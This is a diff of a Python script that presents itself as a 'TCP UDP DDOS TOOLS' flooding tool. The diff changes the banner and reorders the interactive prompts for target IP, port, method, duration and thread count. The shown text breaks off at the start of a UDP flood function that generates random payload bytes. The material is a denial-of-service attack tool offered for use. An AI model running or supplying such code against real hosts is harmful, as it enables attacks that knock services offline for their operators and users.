@@ -5,21 +5,18 @@ import threading
 import os , sys
 
 print ('''
+╔═╗╦╔═╗╦  ═╗ ╦
+╔═╝║║╣ ║  ╔╩╦╝
+╚═╝╩╚═╝╩═╝╩ ╚═''')
+print("#=======TCP UDP DDOS TOOLS============#                          ")
+print("$=======AJARIN AKU JADI HENGKEL=======$                          ")
+print("+=======Tools Codes By : ZieLx======+                          ")
 
-
-  ________ _____ _    __  __
- |__  /_ _| ____| |   \ \/ /
-   / / | ||  _| | |    \  / 
-  / /_ | || |___| |___ /  \ 
- /____|___|_____|_____/_/\_\''')
-print("             =======TCP UDP DDOS TOOLS============                          ")
-print("             =======Create Date :16-04-2022=======                          ")
-print("             =======Tools Created By : ZieLx======                          ")
-ip = str(input(" Ip Target : "))
-port = int(input(" Port Target : "))
-choice = str(input(" Method : "))
-times = int(input(" Times : "))
-threads = int(input(" Threads : "))
+choice = str(input(" UDP/TCP: "))
+ip = str(input(" HOST/IP TARGET: "))
+port = int(input(" PORT TARGET : "))
+times = int(input(" TIMES : "))
+threads = int(input(" THREADS : "))
 os.system("clear")
 def udp():
 	data = random._urandom(900)
